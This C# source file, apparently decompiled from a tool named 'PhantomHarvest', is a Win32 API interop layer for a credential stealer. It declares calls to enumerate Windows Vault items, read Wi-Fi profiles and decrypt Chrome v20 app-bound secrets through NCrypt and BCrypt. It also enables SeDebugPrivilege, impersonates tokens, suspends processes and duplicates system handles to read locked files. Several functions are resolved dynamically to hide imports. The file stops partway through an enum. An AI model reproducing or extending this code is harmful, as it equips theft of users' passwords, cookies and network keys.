using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace PhantomHarvest.Helper
{
	// Token: 0x0200002C RID: 44
	public static class Win32Api
	{
#pragma warning disable 0649, 0169
		[DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
		private static extern IntPtr LoadLibrary(string lpFileName);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Token: 0x06000129 RID: 297
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool RevertToSelf();

		// Dynamic OpenProcessToken
		private delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
		private static OpenProcessTokenDelegate _openProcessToken;
		public static bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle)
		{
			if (_openProcessToken == null)
			{
				IntPtr hModule = LoadLibrary("advapi32.dll");
				IntPtr pFunc = GetProcAddress(hModule, "OpenProcessToken");
				_openProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(OpenProcessTokenDelegate));
			}
			return _openProcessToken(ProcessHandle, DesiredAccess, out TokenHandle);
		}

		// Token: 0x0600012B RID: 299
		[DllImport("advapi32.dll")]
		public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

		// Token: 0x0600012C RID: 300
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

		// Token: 0x0600012D RID: 301
		[DllImport("kernel32", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

		// Token: 0x0600012E RID: 302
		[DllImport("shell32.dll")]
		public static extern int SHGetFolderPath(IntPtr hwndOwner, int nFolder, IntPtr hToken, uint dwFlags, [Out] StringBuilder pszPath);

		// Token: 0x0600012F RID: 303
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetProcessDPIAware();

		// Token: 0x06000130 RID: 304
		[DllImport("ntdll", SetLastError = true)]
		public static extern uint NtSuspendProcess([In] IntPtr Handle);

		// Token: 0x06000131 RID: 305
		[DllImport("ntdll.dll")]
		public static extern uint NtResumeProcess(IntPtr ProcessHandle);

		// Token: 0x06000132 RID: 306
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

		// Token: 0x06000133 RID: 307
		[DllImport("kernel32.dll")]
		public static extern int SetFilePointer(IntPtr hFile, int lDistanceToMove, int lpDistanceToMoveHigh, int dwMoveMethod);

		// Token: 0x06000134 RID: 308
		[DllImport("ntdll.dll")]
		public static extern int NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, int ObjectInformationLength, ref int returnLength);

		// Token: 0x06000135 RID: 309
		[DllImport("kernel32.dll")]
		public static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x06000136 RID: 310
		[DllImport("ntdll.dll")]
		public static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);

		// Token: 0x06000137 RID: 311
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(Win32Api.PROCESS_ACCESS_FLAGS dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		// Token: 0x06000138 RID: 312
		[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CreateFile(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, IntPtr lpSecurityAttributes, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000139 RID: 313
		[DllImport("ntdll.dll")]
		public static extern uint NtQueryInformationFile(IntPtr fileHandle, ref Win32Api.IO_STATUS_BLOCK IoStatusBlock, IntPtr pInfoBlock, uint length, Win32Api.FILE_INFORMATION_CLASS fileInformation);

		// Token: 0x0600013A RID: 314
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

		// Token: 0x0600013B RID: 315
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetCurrentProcess();

		// Token: 0x0600013C RID: 316
		[DllImport("Wlanapi.dll")]
		public static extern int WlanOpenHandle(int dwClientVersion, IntPtr pReserved, out IntPtr pdwNegotiatedVersion, ref IntPtr ClientHandle);

		// Token: 0x0600013D RID: 317
		[DllImport("Wlanapi")]
		public static extern uint WlanCloseHandle([In] IntPtr hClientHandle, IntPtr pReserved);

		// Token: 0x0600013E RID: 318
		[DllImport("Wlanapi")]
		public static extern uint WlanEnumInterfaces([In] IntPtr hClientHandle, IntPtr pReserved, ref IntPtr ppInterfaceList);

		// Dynamic WlanGetProfile
		private delegate uint WlanGetProfileDelegate([In] IntPtr clientHandle, [MarshalAs(UnmanagedType.LPStruct)] [In] Guid interfaceGuid, [MarshalAs(UnmanagedType.LPWStr)] [In] string profileName, [In] IntPtr pReserved, [MarshalAs(UnmanagedType.LPWStr)] out string profileXml, [In] [Out] [Optional] ref int flags, [Optional] out IntPtr pdwGrantedAccess);
		private static WlanGetProfileDelegate _wlanGetProfile;
		public static uint WlanGetProfile([In] IntPtr clientHandle, [MarshalAs(UnmanagedType.LPStruct)] [In] Guid interfaceGuid, [MarshalAs(UnmanagedType.LPWStr)] [In] string profileName, [In] IntPtr pReserved, [MarshalAs(UnmanagedType.LPWStr)] out string profileXml, [In] [Out] [Optional] ref int flags, [Optional] out IntPtr pdwGrantedAccess)
		{
			if (_wlanGetProfile == null)
			{
				IntPtr hModule = LoadLibrary("wlanapi.dll");
				IntPtr pFunc = GetProcAddress(hModule, "WlanGetProfile");
				_wlanGetProfile = (WlanGetProfileDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(WlanGetProfileDelegate));
			}
			return _wlanGetProfile(clientHandle, interfaceGuid, profileName, pReserved, out profileXml, ref flags, out pdwGrantedAccess);
		}

		// Token: 0x06000140 RID: 320
		[DllImport("wlanapi.dll", SetLastError = true)]
		public static extern uint WlanGetProfileList([In] IntPtr clientHandle, [MarshalAs(UnmanagedType.LPStruct)] [In] Guid interfaceGuid, [In] IntPtr pReserved, ref IntPtr profileList);

		// Token: 0x06000141 RID: 321
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

		// Token: 0x06000142 RID: 322
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

		// Token: 0x06000143 RID: 323
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

		// Token: 0x06000144 RID: 324
		[DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
		internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

		// Token: 0x06000145 RID: 325
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

		// Token: 0x06000146 RID: 326
		[DllImport("bcrypt.dll")]
		public static extern uint BCryptDestroyKey(IntPtr hKey);

		// Dynamic BCryptDecrypt
		private delegate uint BCryptDecryptDelegate(IntPtr hKey, byte[] pbInput, int cbInput, ref Win32Api.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);
		private static BCryptDecryptDelegate _bCryptDecrypt;
		internal static uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref Win32Api.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags)
		{
			if (_bCryptDecrypt == null)
			{
				IntPtr hModule = LoadLibrary("bcrypt.dll");
				IntPtr pFunc = GetProcAddress(hModule, "BCryptDecrypt");
				_bCryptDecrypt = (BCryptDecryptDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(BCryptDecryptDelegate));
			}
			return _bCryptDecrypt(hKey, pbInput, cbInput, ref pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, ref pcbResult, dwFlags);
		}

		// Token: 0x06000148 RID: 328
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x06000149 RID: 329
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x0600014A RID: 330
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// NCrypt APIs for Chrome v20 Flag 3
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, int dwFlags);

		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, int dwLegacyKeySpec, int dwFlags);

		[DllImport("ncrypt.dll")]
		public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

		[DllImport("ncrypt.dll")]
		public static extern int NCryptFreeObject(IntPtr hObject);

		// Privilege APIs
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct TOKEN_PRIVILEGES
		{
			public int PrivilegeCount;
			public long Luid;
			public int Attributes;
		}

		public const string SE_DEBUG_NAME = "SeDebugPrivilege";
		public const int SE_PRIVILEGE_ENABLED = 0x00000002;

		// Token: 0x0600014B RID: 331
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x0600014C RID: 332
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x0400006F RID: 111
		public const int CNST_SYSTEM_HANDLE_INFORMATION = 16;

		// Token: 0x04000070 RID: 112
		public const int DUPLICATE_SAME_ACCESS = 2;

		// Token: 0x04000071 RID: 113
		public const uint STATUS_SUCCESS = 0U;

		// Token: 0x04000072 RID: 114
		public const uint STATUS_INFO_LENGTH_MISMATCH = 3221225476U;

		// Token: 0x04000073 RID: 115
		public const uint ERROR_SUCCESS = 0U;

		// Token: 0x04000074 RID: 116
		public const uint BCRYPT_PAD_PSS = 8U;

		// Token: 0x04000075 RID: 117
		public const uint BCRYPT_PAD_OAEP = 4U;

		// Token: 0x04000076 RID: 118
		public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(1296188491);

		// Token: 0x04000077 RID: 119
		public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";

		// Token: 0x04000078 RID: 120
		public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";

		// Token: 0x04000079 RID: 121
		public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";

		// Token: 0x0400007A RID: 122
		public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";

		// Token: 0x0400007B RID: 123
		public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";

		// Token: 0x0400007C RID: 124
		public static readonly string BCRYPT_AES_ALGORITHM = "AES";

		// Token: 0x0400007D RID: 125
		public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

		// Token: 0x0400007E RID: 126
		public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 1;

		// Token: 0x0400007F RID: 127
		public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

		// Token: 0x04000080 RID: 128
		public static readonly uint STATUS_AUTH_TAG_MISMATCH = 3221266434U;

		// Token: 0x02000043 RID: 67
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct SYSTEM_HANDLE_INFORMATION
		{
			// Token: 0x040000D4 RID: 212
			public ushort ProcessID;

			// Token: 0x040000D5 RID: 213
			public ushort CreatorBackTrackIndex;

			// Token: 0x040000D6 RID: 214
			public byte ObjectType;

			// Token: 0x040000D7 RID: 215
			public byte HandleAttribute;

			// Token: 0x040000D8 RID: 216
			public ushort Handle;

			// Token: 0x040000D9 RID: 217
			public IntPtr Object_Pointer;

			// Token: 0x040000DA RID: 218
			public IntPtr AccessMask;
		}

		// Token: 0x02000044 RID: 68
		public enum OBJECT_INFORMATION_CLASS
		{
			// Token: 0x040000DC RID: 220
			ObjectBasicInformation,
			// Token: 0x040000DD RID: 221
			ObjectNameInformation,
			// Token: 0x040000DE RID: 222
			ObjectTypeInformation,
			// Token: 0x040000DF RID: 223
			ObjectAllTypesInformation,
			// Token: 0x040000E0 RID: 224
			ObjectHandleInformation
		}

		// Token: 0x02000045 RID: 69
		public struct FileNameInformation
		{
			// Token: 0x040000E1 RID: 225
			public int NameLength;

			// Token: 0x040000E2 RID: 226
			public char Name;
		}

		// Token: 0x02000046 RID: 70
		public struct UNICODE_STRING
		{
			// Token: 0x060001D5 RID: 469 RVA: 0x0001085C File Offset: 0x0000EA5C
			public override string ToString()
			{
				if (!(this.Buffer != IntPtr.Zero))
				{
					return null;
				}
				return Marshal.PtrToStringUni(this.Buffer, (int)(this.Length / 2));
			}

			// Token: 0x040000E3 RID: 227
			public ushort Length;

			// Token: 0x040000E4 RID: 228
			public ushort MaximumLength;

			// Token: 0x040000E5 RID: 229
			public IntPtr Buffer;
		}

		// Token: 0x02000047 RID: 71
		public struct GENERIC_MAPPING
		{
			// Token: 0x040000E6 RID: 230
			public int GenericRead;

			// Token: 0x040000E7 RID: 231
			public int GenericWrite;

			// Token: 0x040000E8 RID: 232
			public int GenericExecute;

			// Token: 0x040000E9 RID: 233
			public int GenericAll;
		}

		// Token: 0x02000048 RID: 72
		public struct OBJECT_TYPE_INFORMATION
		{
			// Token: 0x040000EA RID: 234
			public Win32Api.UNICODE_STRING Name;

			// Token: 0x040000EB RID: 235
			private int TotalNumberOfObjects;

			// Token: 0x040000EC RID: 236
			private int TotalNumberOfHandles;

			// Token: 0x040000ED RID: 237
			private int TotalPagedPoolUsage;

			// Token: 0x040000EE RID: 238
			private int TotalNonPagedPoolUsage;

			// Token: 0x040000EF RID: 239
			private int TotalNamePoolUsage;

			// Token: 0x040000F0 RID: 240
			private int TotalHandleTableUsage;

			// Token: 0x040000F1 RID: 241
			private int HighWaterNumberOfObjects;

			// Token: 0x040000F2 RID: 242
			private int HighWaterNumberOfHandles;

			// Token: 0x040000F3 RID: 243
			private int HighWaterPagedPoolUsage;

			// Token: 0x040000F4 RID: 244
			private int HighWaterNonPagedPoolUsage;

			// Token: 0x040000F5 RID: 245
			private int HighWaterNamePoolUsage;

			// Token: 0x040000F6 RID: 246
			private int HighWaterHandleTableUsage;

			// Token: 0x040000F7 RID: 247
			private int InvalidAttributes;

			// Token: 0x040000F8 RID: 248
			private Win32Api.GENERIC_MAPPING GenericMapping;

			// Token: 0x040000F9 RID: 249
			private int ValidAccess;

			// Token: 0x040000FA RID: 250
			private bool SecurityRequired;

			// Token: 0x040000FB RID: 251
			private bool MaintainHandleCount;

			// Token: 0x040000FC RID: 252
			private ushort MaintainTypeList;

			// Token: 0x040000FD RID: 253
			private Win32Api.POOL_TYPE PoolType;

			// Token: 0x040000FE RID: 254
			private int PagedPoolUsage;

			// Token: 0x040000FF RID: 255
			private int NonPagedPoolUsage;
		}

		// Token: 0x02000049 RID: 73
		public enum POOL_TYPE
		{
			// Token: 0x04000101 RID: 257
			NonPagedPool,
			// Token: 0x04000102 RID: 258
			PagedPool,
			// Token: 0x04000103 RID: 259
			NonPagedPoolMustSucceed,
			// Token: 0x04000104 RID: 260
			DontUseThisType,
			// Token: 0x04000105 RID: 261
			NonPagedPoolCacheAligned,
			// Token: 0x04000106 RID: 262
			PagedPoolCacheAligned,
			// Token: 0x04000107 RID: 263
			NonPagedPoolCacheAlignedMustS
		}

		// Token: 0x0200004A RID: 74
		public struct IO_STATUS_BLOCK
		{
			// Token: 0x04000108 RID: 264
			public uint Status;

			// Token: 0x04000109 RID: 265
			public IntPtr Information;
		}

		// Token: 0x0200004B RID: 75
		[Flags]
		public enum PROCESS_ACCESS_FLAGS : uint
		{
			// Token: 0x0400010B RID: 267
			PROCESS_ALL_ACCESS = 2035711U,
			// Token: 0x0400010C RID: 268
			PROCESS_CREATE_PROCESS = 128U,
			// Token: 0x0400010D RID: 269
			PROCESS_CREATE_THREAD = 2U,
			// Token: 0x0400010E RID: 270
			PROCESS_DUP_HANDLE = 64U,
			// Token: 0x0400010F RID: 271
			PROCESS_QUERY_INFORMATION = 1024U,
			// Token: 0x04000110 RID: 272
			PROCESS_QUERY_LIMITED_INFORMATION = 4096U,
			// Token: 0x04000111 RID: 273
			PROCESS_SET_INFORMATION = 512U,
			// Token: 0x04000112 RID: 274
			PROCESS_SET_QUOTA = 256U,
			// Token: 0x04000113 RID: 275
			PROCESS_SUSPEND_RESUME = 2048U,
			// Token: 0x04000114 RID: 276
			PROCESS_TERMINATE = 1U,
			// Token: 0x04000115 RID: 277
			PROCESS_VM_OPERATION = 8U,
			// Token: 0x04000116 RID: 278
			PROCESS_VM_READ = 16U,
			// Token: 0x04000117 RID: 279
			PROCESS_VM_WRITE = 32U,
			// Token: 0x04000118 RID: 280
			SYNCHRONIZE = 1048576U
		}

		// Token: 0x0200004C RID: 76
		public enum FILE_INFORMATION_CLASS
		{
			// Token: 0x0400011A RID: 282
			FileDirectoryInformation = 1,
			// Token: 0x0400011B RID: 283
			FileFullDirectoryInformation,
			// Token: 0x0400011C RID: 284
			FileBothDirectoryInformation,
			// Token: 0x0400011D RID: 285
			FileBasicInformation,
			// Token: 0x0400011E RID: 286
			FileStandardInformation,
			// Token: 0x0400011F RID: 287
			FileInternalInformation,
			// Token: 0x04000120 RID: 288
			FileEaInformation,
			// Token: 0x04000121 RID: 289
			FileAccessInformation,
			// Token: 0x04000122 RID: 290
			FileNameInformation,
			// Token: 0x04000123 RID: 291
			FileRenameInformation,
			// Token: 0x04000124 RID: 292
			FileLinkInformation,
			// Token: 0x04000125 RID: 293
			FileNamesInformation,
			// Token: 0x04000126 RID: 294
			FileDispositionInformation,
			// Token: 0x04000127 RID: 295
			FilePositionInformation,
			// Token: 0x04000128 RID: 296
			FileFullEaInformation,
			// Token: 0x04000129 RID: 297
			FileModeInformation,
			// Token: 0x0400012A RID: 298
			FileAlignmentInformation,
			// Token: 0x0400012B RID: 299
			FileAllInformation,
			// Token: 0x0400012C RID: 300
			FileAllocationInformation,
			// Token: 0x0400012D RID: 301
			FileEndOfFileInformation,
			// Token: 0x0400012E RID: 302
			FileAlternateNameInformation,
			// Token: 0x0400012F RID: 303
			FileStreamInformation,
			// Token: 0x04000130 RID: 304
			FilePipeInformation,
			// Token: 0x04000131 RID: 305
			FilePipeLocalInformation,
			// Token: 0x04000132 RID: 306
			FilePipeRemoteInformation,
			// Token: 0x04000133 RID: 307
			FileMailslotQueryInformation,
			// Token: 0x04000134 RID: 308
			FileMailslotSetInformation,
			// Token: 0x04000135 RID: 309
			FileCompressionInformation,
			// Token: 0x04000136 RID: 310
			FileObjectIdInformation,
			// Token: 0x04000137 RID: 311
			FileCompletionInformation,
			// Token: 0x04000138 RID: 312
			FileMoveClusterInformation,
			// Token: 0x04000139 RID: 313
			FileQuotaInformation,
			// Token: 0x0400013A RID: 314
			FileReparsePointInformation,
			// Token: 0x0400013B RID: 315
			FileNetworkOpenInformation,
			// Token: 0x0400013C RID: 316
			FileAttributeTagInformation,
			// Token: 0x0400013D RID: 317
			FileTrackingInformation,
			// Token: 0x0400013E RID: 318
			FileIdBothDirectoryInformation,
			// Token: 0x0400013F RID: 319
			FileIdFullDirectoryInformation,
			// Token: 0x04000140 RID: 320
			FileValidDataLengthInformation,
			// Token: 0x04000141 RID: 321
			FileShortNameInformation,
			// Token: 0x04000142 RID: 322
			FileIoCompletionNotificationInformation,
			// Token: 0x04000143 RID: 323
			FileIoStatusBlockRangeInformation,
			// Token: 0x04000144 RID: 324
			FileIoPriorityHintInformation,
			// Token: 0x04000145 RID: 325
			FileSfioReserveInformation,
			// Token: 0x04000146 RID: 326
			FileSfioVolumeInformation,
			// Token: 0x04000147 RID: 327
			FileHardLinkInformation,
			// Token: 0x04000148 RID: 328
			FileProcessIdsUsingFileInformation,
			// Token: 0x04000149 RID: 329
			FileNormalizedNameInformation,
			// Token: 0x0400014A RID: 330
			FileNetworkPhysicalNameInformation,
			// Token: 0x0400014B RID: 331
			FileMaximumInformation
		}

		// Token: 0x0200004D RID: 77
		public struct WLAN_INTERFACE_INFO_LIST
		{
			// Token: 0x060001D6 RID: 470 RVA: 0x00010888 File Offset: 0x0000EA88
			public WLAN_INTERFACE_INFO_LIST(IntPtr pList)
			{
				this.dwNumberofItems = (int)Marshal.ReadInt64(pList, 0);
				this.dwIndex = (int)Marshal.ReadInt64(pList, 4);
				this.InterfaceInfo = new Win32Api.WLAN_INTERFACE_INFO[this.dwNumberofItems];
				for (int i = 0; i < this.dwNumberofItems; i++)
				{
					Win32Api.WLAN_INTERFACE_INFO wlan_INTERFACE_INFO = (Win32Api.WLAN_INTERFACE_INFO)Marshal.PtrToStructure(new IntPtr(pList.ToInt64() + (long)(i * 532) + 8L), typeof(Win32Api.WLAN_INTERFACE_INFO));
					this.InterfaceInfo[i] = wlan_INTERFACE_INFO;
				}
			}

			// Token: 0x0400014C RID: 332
			public int dwNumberofItems;

			// Token: 0x0400014D RID: 333
			public int dwIndex;

			// Token: 0x0400014E RID: 334
			public Win32Api.WLAN_INTERFACE_INFO[] InterfaceInfo;
		}

		// Token: 0x0200004E RID: 78
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct WLAN_INTERFACE_INFO
		{
			// Token: 0x0400014F RID: 335
			public Guid InterfaceGuid;

			// Token: 0x04000150 RID: 336
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
			public string strInterfaceDescription;
		}

		// Token: 0x0200004F RID: 79
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct WLAN_PROFILE_INFO
		{
			// Token: 0x04000151 RID: 337
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
			public string strProfileName;

			// Token: 0x04000152 RID: 338
			public Win32Api.WlanProfileFlags ProfileFLags;
		}

		// Token: 0x02000050 RID: 80
		[Flags]
		public enum WlanProfileFlags
		{
			// Token: 0x04000154 RID: 340
			AllUser = 0,
			// Token: 0x04000155 RID: 341
			GroupPolicy = 1,
			// Token: 0x04000156 RID: 342
			User = 2
		}

		// Token: 0x02000051 RID: 81
		public struct WLAN_PROFILE_INFO_LIST
		{
			// Token: 0x060001D7 RID: 471 RVA: 0x00010910 File Offset: 0x0000EB10
			public WLAN_PROFILE_INFO_LIST(IntPtr ppProfileList)
			{
				this.dwNumberOfItems = (int)Marshal.ReadInt64(ppProfileList);
				this.dwIndex = (int)Marshal.ReadInt64(ppProfileList, 4);
				this.ProfileInfo = new Win32Api.WLAN_PROFILE_INFO[this.dwNumberOfItems];
				IntPtr intPtr = new IntPtr(ppProfileList.ToInt64() + 8L);
				for (int i = 0; i < this.dwNumberOfItems; i++)
				{
					ppProfileList = new IntPtr(intPtr.ToInt64() + (long)(i * Marshal.SizeOf(typeof(Win32Api.WLAN_PROFILE_INFO))));
					this.ProfileInfo[i] = (Win32Api.WLAN_PROFILE_INFO)Marshal.PtrToStructure(ppProfileList, typeof(Win32Api.WLAN_PROFILE_INFO));
				}
			}

			// Token: 0x04000157 RID: 343
			public int dwNumberOfItems;

			// Token: 0x04000158 RID: 344
			public int dwIndex;

			// Token: 0x04000159 RID: 345
			public Win32Api.WLAN_PROFILE_INFO[] ProfileInfo;
		}

		// Token: 0x02000052 RID: 82
		public struct BCRYPT_PSS_PADDING_INFO
		{
			// Token: 0x060001D8 RID: 472 RVA: 0x000109AD File Offset: 0x0000EBAD
			public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
			{
				this.pszAlgId = pszAlgId;
				this.cbSalt = cbSalt;
			}

			// Token: 0x0400015A RID: 346
			[MarshalAs(UnmanagedType.LPWStr)]
			public string pszAlgId;

			// Token: 0x0400015B RID: 347
			public int cbSalt;
		}

		// Token: 0x02000053 RID: 83
		public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
		{
			// Token: 0x060001D9 RID: 473 RVA: 0x000109C0 File Offset: 0x0000EBC0
			public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
			{
				this = default(Win32Api.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
				this.dwInfoVersion = Win32Api.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
				this.cbSize = Marshal.SizeOf(typeof(Win32Api.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
				if (iv != null)
				{
					this.cbNonce = iv.Length;
					this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
					Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
				}
				if (aad != null)
				{
					this.cbAuthData = aad.Length;
					this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
					Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
				}
				if (tag != null)
				{
					this.cbTag = tag.Length;
					this.pbTag = Marshal.AllocHGlobal(this.cbTag);
					Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
					this.cbMacContext = tag.Length;
					this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
				}
			}

			// Token: 0x060001DA RID: 474 RVA: 0x00010AA0 File Offset: 0x0000ECA0
			public void Dispose()
			{
				if (this.pbNonce != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbNonce);
				}
				if (this.pbTag != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbTag);
				}
				if (this.pbAuthData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbAuthData);
				}
				if (this.pbMacContext != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(this.pbMacContext);
				}
			}

			// Token: 0x0400015C RID: 348
			public int cbSize;

			// Token: 0x0400015D RID: 349
			public int dwInfoVersion;

			// Token: 0x0400015E RID: 350
			public IntPtr pbNonce;

			// Token: 0x0400015F RID: 351
			public int cbNonce;

			// Token: 0x04000160 RID: 352
			public IntPtr pbAuthData;

			// Token: 0x04000161 RID: 353
			public int cbAuthData;

			// Token: 0x04000162 RID: 354
			public IntPtr pbTag;

			// Token: 0x04000163 RID: 355
			public int cbTag;

			// Token: 0x04000164 RID: 356
			public IntPtr pbMacContext;

			// Token: 0x04000165 RID: 357
			public int cbMacContext;

			// Token: 0x04000166 RID: 358
			public int cbAAD;

			// Token: 0x04000167 RID: 359
			public long cbData;

			// Token: 0x04000168 RID: 360
			public int dwFlags;
		}

		// Token: 0x02000054 RID: 84
		public struct BCRYPT_OAEP_PADDING_INFO
		{
			// Token: 0x060001DB RID: 475 RVA: 0x00010B21 File Offset: 0x0000ED21
			public BCRYPT_OAEP_PADDING_INFO(string alg)
			{
				this.pszAlgId = alg;
				this.pbLabel = IntPtr.Zero;
				this.cbLabel = 0;
			}

			// Token: 0x04000169 RID: 361
			[MarshalAs(UnmanagedType.LPWStr)]
			public string pszAlgId;

			// Token: 0x0400016A RID: 362
			public IntPtr pbLabel;

			// Token: 0x0400016B RID: 363
			public int cbLabel;
		}

		// Token: 0x02000055 RID: 85
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x0400016D RID: 365
			Undefined = -1,
			// Token: 0x0400016E RID: 366
			Boolean,
			// Token: 0x0400016F RID: 367
			Short,
			// Token: 0x04000170 RID: 368
			UnsignedShort,
			// Token: 0x04000171 RID: 369
			Int,
